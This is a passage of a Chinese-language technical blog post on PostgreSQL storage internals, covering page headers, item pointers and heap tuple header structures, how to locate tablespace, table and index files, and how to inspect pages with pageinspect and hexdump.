*/</span></span></span><br></pre></td></tr></table></figure></li><li><p>pg_lower和pg_upper：最后一个项指针的位置和最新的tuple位置。主要进行查找空闲位置，进行插入工作。</p></li><li>pg_special：page预留的位置，可以存储索引等信息。</li><li><p>pg_pagesize_version：page大小以及当前版本。page大小可以通过configure进行设置。version的意思是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Page layout version number 0 is for pre-7.3 Postgres releases.</span></span><br><span class="line"><span class="comment"> * Releases 7.3 and 7.4 use 1, denoting a new HeapTupleHeader layout.</span></span><br><span class="line"><span class="comment"> * Release 8.0 uses 2; it changed the HeapTupleHeader layout again.</span></span><br><span class="line"><span class="comment"> * Release 8.1 uses 3; it redefined HeapTupleHeader infomask bits.</span></span><br><span class="line"><span class="comment"> * Release 8.3 uses 4; it changed the HeapTupleHeader layout again, and</span></span><br><span class="line"><span class="comment"> *added the pd_flags field (by stealing some bits from pd_tli),</span></span><br><span class="line"><span class="comment"> *as well as adding the pd_prune_xid field (which enlarges the header).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * As of Release 9.3, the checksum version must also be considered when</span></span><br><span class="line"><span class="comment"> * handling pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></li><li><p>pg_prune_xid: 一般是最后一次删除或者更新的xid;</p></li><li>pg_linp  项指针;</li></ul><p>ItemIdData指向指针:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ItemIdData</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> lp_off:<span class="number">15</span>,<span class="comment">/* offset to tuple (from start of page) */</span>  <span class="comment">//指向Items;</span></span><br><span class="line">lp_flags:<span class="number">2</span>,<span class="comment">/* state of item pointer, see below */</span></span><br><span class="line">lp_len:<span class="number">15</span>;<span class="comment">/* byte length of tuple */</span> </span><br><span class="line">&#125; ItemIdData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> ItemIdData *ItemId;</span><br></pre></td></tr></table></figure><p>表与序列的结构<code>HeapTupleHeaderData</code></p><ul><li>Tuple 头部信息</li><li>实际数据信息</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">HeapTupleFields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">TransactionId t_xmin;<span class="comment">/* inserting xact ID */</span></span><br><span class="line">TransactionId t_xmax;<span class="comment">/* deleting or locking xact ID */</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line">CommandIdt_cid;<span class="comment">/* inserting or deleting command ID, or both */</span></span><br><span class="line">TransactionId t_xvac;<span class="comment">/* old-style VACUUM FULL xact ID */</span></span><br><span class="line">&#125;t_field3;</span><br><span class="line">&#125; HeapTupleFields;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DatumTupleFields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">int32datum_len_;<span class="comment">/* varlena header (do not touch directly!) */</span></span><br><span class="line">int32datum_typmod;<span class="comment">/* -1, or identifier of a record type */</span></span><br><span class="line">Oiddatum_typeid;<span class="comment">/* composite type OID, or RECORDOID */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note: field ordering is chosen with thought that Oid might someday</span></span><br><span class="line"><span class="comment"> * widen to 64 bits.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#125; DatumTupleFields;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BlockIdData</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">uint16bi_hi;</span><br><span class="line">uint16bi_lo;</span><br><span class="line">&#125; BlockIdData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ItemPointerData</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">BlockIdData ip_blkid;</span><br><span class="line">OffsetNumber ip_posid;   <span class="comment">// uint16</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">HeapTupleHeaderData</span>  </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line">HeapTupleFields t_heap;</span><br><span class="line">DatumTupleFields t_datum;</span><br><span class="line">&#125;t_choice;</span><br><span class="line">ItemPointerData t_ctid;<span class="comment">/* current TID of this or newer tuple (or a</span></span><br><span class="line"><span class="comment"> * speculative insertion token) */</span></span><br><span class="line"><span class="comment">/* Fields below here must match MinimalTupleData! */</span></span><br><span class="line">uint16t_infomask2;<span class="comment">/* number of attributes + various flags */</span> <span class="comment">//2Byte</span></span><br><span class="line">uint16t_infomask;<span class="comment">/* various flag bits, see below */</span>         <span class="comment">//2Byte</span></span><br><span class="line">uint8t_hoff;<span class="comment">/* sizeof header incl. bitmap, padding */</span> <span class="comment">//1Byte</span></span><br><span class="line"><span class="comment">/* ^ - 23 bytes - ^ */</span></span><br><span class="line">bits8t_bits[FLEXIBLE_ARRAY_MEMBER];<span class="comment">/* bitmap of NULLs */</span></span><br><span class="line"><span class="comment">/* MORE DATA FOLLOWS AT END OF STRUCT */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Rel结构体展开 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Field           Type            Length  Offset  Description</span><br><span class="line">t_xmin          TransactionId   <span class="number">4</span> bytes <span class="number">0</span>       insert XID stamp</span><br><span class="line">t_xmax          TransactionId   <span class="number">4</span> bytes <span class="number">4</span>       <span class="keyword">delete</span> XID stamp</span><br><span class="line">t_cid           CommandId       <span class="number">4</span> bytes <span class="number">8</span>       insert <span class="keyword">and</span>/<span class="function"><span class="keyword">or</span> <span class="keyword">delete</span> CID <span class="title">stamp</span> <span class="params">(overlays with t_xvac)</span></span></span><br><span class="line"><span class="function">t_xvac          TransactionId   4 bytes 8       XID <span class="keyword">for</span> VACUUM operation moving a row version</span></span><br><span class="line"><span class="function">t_ctid          ItemPointerData 6 bytes 12      current TID of <span class="keyword">this</span> <span class="keyword">or</span> newer row version</span></span><br><span class="line">t_infomask2     uint16          2 bytes 18      number of attributes, plus various flag bits</span><br><span class="line">t_infomask      uint16          <span class="number">2</span> bytes <span class="number">20</span>      various flag bits</span><br><span class="line">t_hoff          uint8           <span class="number">1</span> byte  <span class="number">22</span>      offset to user data</span><br><span class="line"><span class="comment">//注意：t_cid和t_xvac为联合体，共用存储空间</span></span><br></pre></td></tr></table></figure><ul><li>xmin 和 xmax 是插入，删除，更新操作时的事务ID，插入时会在xmin内写入当前事务ID，删除时在xmax写入当前事务ID，更新是进行删除后再插入。</li><li>t_cid  是指一个事务内的命令ID, 每个事务都从0开始。</li><li>t_ctid 物理ID。</li><li><p>t_infomask2 取值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * information stored in t_infomask2:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_NATTS_MASK0x07FF<span class="comment">/* 11 bits for number of attributes */</span></span></span><br><span class="line"><span class="comment">/* bits 0x1800 are available */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_KEYS_UPDATED0x2000<span class="comment">/* tuple was updated and key cols</span></span></span><br><span class="line"><span class="meta"><span class="comment"> * modified, or tuple deleted */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_HOT_UPDATED0x4000<span class="comment">/* tuple was HOT-updated */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_ONLY_TUPLE0x8000<span class="comment">/* this is heap-only tuple */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP2_XACT_MASK0xE000<span class="comment">/* visibility-related bits */</span></span></span><br></pre></td></tr></table></figure></li><li><p>t_infomask 取值:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * information stored in t_infomask:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_HASNULL0x0001<span class="comment">/* has null attribute(s) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_HASVARWIDTH0x0002<span class="comment">/* has variable-width attribute(s) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_HASEXTERNAL0x0004<span class="comment">/* has external stored attribute(s) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_HASOID0x0008<span class="comment">/* has an object-id field */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_XMAX_KEYSHR_LOCK0x0010<span class="comment">/* xmax is a key-shared locker */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_COMBOCID0x0020<span class="comment">/* t_cid is a combo cid */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_XMAX_EXCL_LOCK0x0040<span class="comment">/* xmax is exclusive locker */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_XMAX_LOCK_ONLY0x0080<span class="comment">/* xmax, if valid, is only a locker */</span></span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* xmax is a shared locker */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_XMAX_SHR_LOCK(HEAP_XMAX_EXCL_LOCK | HEAP_XMAX_KEYSHR_LOCK)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_LOCK_MASK(HEAP_XMAX_SHR_LOCK | HEAP_XMAX_EXCL_LOCK | \</span></span><br><span class="line"> HEAP_XMAX_KEYSHR_LOCK)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_XMIN_COMMITTED0x0100<span class="comment">/* t_xmin committed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_XMIN_INVALID0x0200<span class="comment">/* t_xmin invalid/aborted */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_XMIN_FROZEN(HEAP_XMIN_COMMITTED|HEAP_XMIN_INVALID)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_XMAX_COMMITTED0x0400<span class="comment">/* t_xmax committed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_XMAX_INVALID0x0800<span class="comment">/* t_xmax invalid/aborted */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_XMAX_IS_MULTI0x1000<span class="comment">/* t_xmax is a MultiXactId */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_UPDATED0x2000<span class="comment">/* this is UPDATEd version of row */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_MOVED_OFF0x4000<span class="comment">/* moved to another place by pre-9.0</span></span></span><br><span class="line"><span class="meta"><span class="comment"> * VACUUM FULL; kept for binary</span></span></span><br><span class="line"><span class="meta"><span class="comment"> * upgrade support */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_MOVED_IN0x8000<span class="comment">/* moved from another place by pre-9.0</span></span></span><br><span class="line"><span class="meta"><span class="comment"> * VACUUM FULL; kept for binary</span></span></span><br><span class="line"><span class="meta"><span class="comment"> * upgrade support */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_MOVED (HEAP_MOVED_OFF | HEAP_MOVED_IN)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_XACT_MASK0xFFF0<span class="comment">/* visibility-related bits */</span></span></span><br></pre></td></tr></table></figure></li><li><p>t_hoff： HeapTupleHeaderData长度，如果有OID会增加4，受字节对齐影响，会增加8</p></li><li>t_bits： 指向实际具体数据。</li></ul><p><br></p><h5 id="tablespace-位置"><a href="#tablespace-位置" class="headerlink" title="tablespace 位置"></a><code>tablespace</code> 位置</h5><p>查看数据文件首先知道数据文件存放于表空间下，首先需要知道表空间OId</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Postgres=# select oid, datname from pg_database ;</span><br><span class="line">  oid  |  datname  </span><br><span class="line"><span class="comment">-------+-----------</span></span><br><span class="line">     1 | template1</span><br><span class="line"> 13356 | template0</span><br><span class="line"> 13361 | highgo</span><br><span class="line"> 16384 | Postgres</span><br></pre></td></tr></table></figure><p>其次表空间分为系统表空间与用户自定义表空间。</p><p>PG系统表空间默认有两个:pg_default 和 pg_global</p><p>pg_default 的文件存放在PGDATA/base目录下</p><p>pg_global 的文件存放在PGDATA/global目录下。</p><p>用户自定义的表空间在PGDATA/pg_tblspc存在一个软连接，指向实际的存放目录 <code>create tablespace 指定的location</code> 软连接以表空间OID命名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Postgres=# create tablespace test owner Postgres LOCATION &apos;/home/Postgres/db&apos;;</span><br><span class="line">Postgres=# select oid, * from pg_tablespace ;</span><br><span class="line">oid  |  spcname   | spcowner | spcacl | spcoptions </span><br><span class="line">-------+------------+----------+--------+------------</span><br><span class="line">  1663 | pg_default |       10 |        | </span><br><span class="line">  1664 | pg_global  |       10 |        |   </span><br><span class="line"> 16389 | test       |       10 |        |</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell$ /home/Postgres/dbtest/pg_tblspc</span><br><span class="line">0 lrwxrwxrwx. 1 Postgres Postgres 15 Oct  7 10:28 16389 -&gt; /home/Postgres/db</span><br></pre></td></tr></table></figure><p><br></p><h5 id="table-位置"><a href="#table-位置" class="headerlink" title="table 位置"></a><code>table</code> 位置</h5><p>pg中每个表都是一个文件，文件以filenode命名。filenode的值可以从<code>pg_class</code>的<code>relfilenode</code>字段获取。<br>当表大小超过1G的时候，表文件会被分割,第一个文件的名字是filenode，第二个则是filenode.1 依次后推，<br>表文件大小限额1G是PG默认值，该值可以通过编译–with-segsize来改变。</p><p><strong>方法一</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Postgres=# select relname, relfilenode,  relnamespace from pg_class where relname = 'pagetest';</span><br><span class="line"> relname  | relfilenode | relnamespace </span><br><span class="line"><span class="comment">----------+-------------+--------------</span></span><br><span class="line"> pagetest |       16406 |         2200</span><br></pre></td></tr></table></figure><p><strong>方法二</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Postgres=# select pg_relation_filepath(&apos;pagetest&apos;);</span><br><span class="line">-[ RECORD 1 ]--------+-----------------</span><br><span class="line">pg_relation_filepath | base/16384/16406</span><br></pre></td></tr></table></figure><p>在表空间目录下, 通常与表Filenode相关的还有两个文件， filenode_fsm 和 filenode_vm .<br>fsm 文件为 free space map.  用于跟踪表文件中的空闲空间。<br>vm  文件为 visibility map.  用于跟踪哪些page包含对所有事务都可见的tuple。</p><p><br></p><h5 id="index-位置"><a href="#index-位置" class="headerlink" title="index  位置"></a><code>index</code>  位置</h5><p>在Pagetest表上创建索引</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Postgres=# create index ON pagetest using brin ( id );</span><br></pre></td></tr></table></figure><p>查看索引存放文件位置:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Postgres=# select pg_relation_filepath('pagetest_id_idx');</span><br><span class="line"> pg_relation_filepath </span><br><span class="line"><span class="comment">----------------------</span></span><br><span class="line"> base/16384/16409</span><br></pre></td></tr></table></figure><p><br></p><h5 id="Pageinspect查看Page内容"><a href="#Pageinspect查看Page内容" class="headerlink" title="Pageinspect查看Page内容"></a><strong>Pageinspect查看Page内容</strong></h5><p><strong>安装</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd $PGSRC/contrib/pageinspect</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p><strong>简单使用</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create extension pageinspect ;</span><br></pre></td></tr></table></figure><p><br></p><h6 id="Table"><a href="#Table" class="headerlink" title="Table"></a><code>Table</code></h6><p><strong>查看raw_page 十六进制内容:</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\x     # Expanded display is on.</span><br><span class="line"></span><br><span class="line">select * from get_raw_page('pagetest', 0);</span><br></pre></td></tr></table></figure><p><strong>header &amp; items;</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Postgres=# select * from page_header(get_raw_page(&apos;pagetest&apos;,0));  </span><br><span class="line">    lsn    | checksum | flags | lower | upper | special | pagesize | version | prune_xid </span><br><span class="line">-----------+----------+-------+-------+-------+---------+----------+---------+-----------</span><br><span class="line"> 0/185E030 |        0 |     0 |    40 |  8032 |    8192 |     8192 |       4 |         0</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Postgres=# select * from heap_page_items(get_raw_page(&apos;pagetest&apos;,0));</span><br><span class="line"> lp | lp_off | lp_flags | lp_len | t_xmin | t_xmax | t_field3 | t_ctid | t_infomask2 | t_infomask | t_hoff | t_bits | t_oid </span><br><span class="line">----+--------+----------+--------+--------+--------+----------+--------+-------------+------------+--------+--------+-------</span><br><span class="line">  1 |   8152 |        1 |     39 |   1842 |      0 |        0 | (0,1)  |           3 |       2306 |     24 |        |      </span><br><span class="line">  2 |   8112 |        1 |     39 |   1843 |      0 |        0 | (0,2)  |           3 |       2306 |     24 |        |      </span><br><span class="line">  3 |   8072 |        1 |     39 |   1844 |      0 |        0 | (0,3)  |           3 |       2306 |     24 |        |      </span><br><span class="line">  4 |   8032 |        1 |     39 |   1845 |      0 |        0 | (0,4)  |           3 |       2306 |     24 |        |      </span><br><span class="line">(4 rows)</span><br></pre></td></tr></table></figure><p><strong><code>update：</code> page_items 变化</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Postgres=# select * from heap_page_items(get_raw_page('pagetest', 0));</span><br><span class="line"> lp | lp_off | lp_flags | lp_len | t_xmin | t_xmax | t_field3 | t_ctid | t_infomask2 | t_infomask | t_hoff | t_bits | t_oid </span><br><span class="line"><span class="comment">----+--------+----------+--------+--------+--------+----------+--------+-------------+------------+--------+--------+-------</span></span><br><span class="line">  1 |   8152 |        1 |     39 |   1842 |      0 |        0 | (0,1)  |           3 |       2306 |     24 |        |      </span><br><span class="line">  2 |   8112 |        1 |     39 |   1843 |      0 |        0 | (0,2)  |           3 |       2306 |     24 |        |      </span><br><span class="line">  3 |   8072 |        1 |     39 |   1844 |      0 |        0 | (0,3)  |           3 |       2306 |     24 |        |      </span><br><span class="line">  4 |   8032 |        1 |     39 |   1845 |   1846 |        0 | (0,5)  |       16387 |        258 |     24 |        |      </span><br><span class="line">  5 |   7992 |        1 |     39 |   1846 |      0 |        0 | (0,5)  |       32771 |      10242 |     24 |        |</span><br></pre></td></tr></table></figure><p>第4条记录  t_xmax 被修改为 1846 , t_xmax 只有被delete的时候才会被标记， 而第五条记录发现t_xmin被修改为1846，说明是同一事务进行操作，说明进行的操作为update;</p><p><strong><code>insert</code> page_header变化</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Postgres=# select * from page_header(get_raw_page('pagetest',0));</span><br><span class="line">    lsn    | <span class="keyword">checksum</span> | flags | <span class="keyword">lower</span> | <span class="keyword">upper</span> | special | pagesize | <span class="keyword">version</span> | prune_xid </span><br><span class="line"><span class="comment">-----------+----------+-------+-------+-------+---------+----------+---------+-----------</span></span><br><span class="line"> <span class="number">0</span>/<span class="number">18603</span>F0 |        <span class="number">0</span> |     <span class="number">0</span> |    <span class="number">48</span> |  <span class="number">7952</span> |    <span class="number">8192</span> |     <span class="number">8192</span> |       <span class="number">4</span> |      <span class="number">1846</span></span><br><span class="line">(<span class="number">1</span> <span class="keyword">row</span>)</span><br></pre></td></tr></table></figure><p>进行insert操作<code>insert into pagetest values ( 7, &#39;7&#39;, &#39;g&#39; );</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    lsn    | <span class="keyword">checksum</span> | flags | <span class="keyword">lower</span> | <span class="keyword">upper</span> | special | pagesize | <span class="keyword">version</span> | prune_xid </span><br><span class="line"><span class="comment">-----------+----------+-------+-------+-------+---------+----------+---------+-----------</span></span><br><span class="line"> <span class="number">0</span>/<span class="number">1860460</span> |        <span class="number">0</span> |     <span class="number">0</span> |    <span class="number">52</span> |  <span class="number">7912</span> |    <span class="number">8192</span> |     <span class="number">8192</span> |       <span class="number">4</span> |      <span class="number">1846</span></span><br></pre></td></tr></table></figure><p>比较发现 lsn, lower, upper 三项发生了变化。<br>lsn   记录最后一次对page修改的xlog记录id<br>lower 每次从前向后申请 4Byte字节<br>upper 每次从后向前从Free Space申请39字节，因为字节对齐 申请40Byte;</p><p><br></p><h6 id="index"><a href="#index" class="headerlink" title="index"></a><code>index</code></h6><p>查看索引类型:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Postgres=# \d pagetest</span><br><span class="line">          Table "public.pagetest"</span><br><span class="line"> Column |         Type          | Modifiers </span><br><span class="line"><span class="comment">--------+-----------------------+-----------</span></span><br><span class="line"> id     | integer               | </span><br><span class="line"> c1     | character(8)          | </span><br><span class="line"> c2     | character varying(16) | </span><br><span class="line">Indexes:</span><br><span class="line">    "pagetest_id_idx" brin (id)</span><br></pre></td></tr></table></figure><p>查看Page Header;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Postgres=# SELECT * from  page_header(get_raw_page('pagetest_id_idx', 0));</span><br><span class="line">    lsn    | <span class="keyword">checksum</span> | flags | <span class="keyword">lower</span> | <span class="keyword">upper</span> | special | pagesize | <span class="keyword">version</span> | prune_xid </span><br><span class="line"><span class="comment">-----------+----------+-------+-------+-------+---------+----------+---------+-----------</span></span><br><span class="line"> <span class="number">0</span>/<span class="number">1872</span>A90 |        <span class="number">0</span> |     <span class="number">0</span> |    <span class="number">24</span> |  <span class="number">8184</span> |    <span class="number">8184</span> |     <span class="number">8192</span> |       <span class="number">4</span> |         <span class="number">0</span></span><br></pre></td></tr></table></figure><p>根据pageinspect提供相关索引进行查看信息:<br>不同类型索引使用的存储结构不同; 常见索引如下:</p><ul><li>brin    </li><li>btree   </li><li>gin     </li><li>gist    </li><li>hash    </li><li>spgist</li></ul><p><br></p><h5 id="hexdump-解析数据文件"><a href="#hexdump-解析数据文件" class="headerlink" title="hexdump 解析数据文件"></a>hexdump 解析数据文件</h5><p>可以对照pageinspesct 进行信息对照。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell$ hexdump -C <span class="number">16406</span> -s <span class="number">0</span> -n <span class="number">8</span></span><br><span class="line"><span class="number">00000000</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> / <span class="number">30</span> e0 <span class="number">85</span> <span class="number">01</span>                           |....<span class="number">0</span>...|</span><br><span class="line"><span class="number">00000008</span></span><br></pre></td></tr></table></figure><ul><li>前4Byte是TimeLineID   0x00000000</li><li>后4Byte是 0x0185e030   </li></ul><p>组合 0/185e030   </p><p>ItemIdData:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Postgres$</span> hexdump -C 16406 -s 24 -n 4</span><br><span class="line">00000018  d8 9f 4e 00                                       |..N.|</span><br><span class="line">0000001c</span><br><span class="line"></span><br><span class="line"><span class="meta">Postgres$</span> echo $(( 0x9fd8 &amp; ~(1 &lt;&lt; 15) ))  ## 取低15位，指向Items;-实际项;</span><br><span class="line">8152</span><br><span class="line"></span><br><span class="line"><span class="meta">Postgres$</span> echo $(( 0x004e &gt;&gt; 1 ))     ## 取高15位； 得到lp_len (Tuple元组 length)</span><br><span 